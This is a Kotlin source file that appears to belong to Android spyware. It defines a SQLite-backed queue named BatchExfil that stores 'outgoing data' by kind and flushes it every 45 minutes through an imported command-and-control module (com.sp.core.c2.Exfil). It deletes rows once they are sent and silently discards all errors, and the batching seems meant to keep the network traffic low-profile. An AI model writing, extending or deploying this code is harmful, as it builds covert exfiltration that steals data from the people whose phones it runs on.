package com.sp.core.util

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import com.sp.core.c2.Exfil

class BatchDbHelper(ctx: Context) : SQLiteOpenHelper(ctx, "batch.db", null, 1) {
    override fun onCreate(db: SQLiteDatabase) {
        db.execSQL(
            """
            CREATE TABLE batch (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                kind TEXT NOT NULL,
                payload TEXT NOT NULL,
                ts INTEGER NOT NULL,
                sent INTEGER DEFAULT 0
            )
            """.trimIndent()
        )
        db.execSQL("CREATE INDEX idx_batch_sent_ts ON batch(sent, ts)")
    }

    override fun onUpgrade(db: SQLiteDatabase, oldV: Int, newV: Int) {
        db.execSQL("DROP TABLE IF EXISTS batch")
        onCreate(db)
    }
}

/**
 * Outgoing data is buffered in SQLite and flushed in batches — one request
 * per kind every 45 minutes instead of dozens of small HTTP calls.
 */
object BatchExfil {

    const val FLUSH_INTERVAL_MS = 45 * 60 * 1000L
    private const val BATCH_SIZE = 200

    private fun db(ctx: Context): SQLiteDatabase = BatchDbHelper(ctx).writableDatabase

    fun enqueue(ctx: Context, kind: String, payload: String) {
        try {
            val cv = ContentValues().apply {
                put("kind", kind)
                put("payload", payload)
                put("ts", System.currentTimeMillis())
                put("sent", 0)
            }
            db(ctx).insert("batch", null, cv)
        } catch (_: Throwable) {
        }
    }

    /** Groups pending rows by kind and sends one request per kind. */
    fun flush(ctx: Context) {
        val d = db(ctx)
        val rows = d.query(
            "batch",
            arrayOf("id", "kind", "payload"),
            "sent = 0",
            null, null, null, "ts ASC", "$BATCH_SIZE"
        )
        val byKind = LinkedHashMap<String, MutableList<Pair<Long, String>>>()
        while (rows.moveToNext()) {
            val id = rows.getLong(0)
            val kind = rows.getString(1) ?: "misc"
            val payload = rows.getString(2) ?: "{}"
            byKind.getOrPut(kind) { mutableListOf() }.add(id to payload)
        }
        rows.close()
        if (byKind.isEmpty()) return

        for ((kind, items) in byKind) {
            val payloads = items.map { it.second }
            Exfil.sendBatch(ctx, kind, payloads) { ok ->
                if (!ok) return@sendBatch
                try {
                    val ids = items.map { it.first.toString() }
                    val placeholders = ids.joinToString(",") { "?" }
                    db(ctx).delete("batch", "id IN ($placeholders)", ids.toTypedArray())
                } catch (_: Throwable) {
                }
            }
        }
    }

    fun pendingCount(ctx: Context): Int {
        return try {
            val d = db(ctx)
            val c = d.query("batch", arrayOf("count(*)"), "sent = 0", null, null, null, null)
            c.moveToFirst()
            val n = c.getInt(0)
            c.close()
            n
        } catch (_: Throwable) {
            0
        }
    }
}
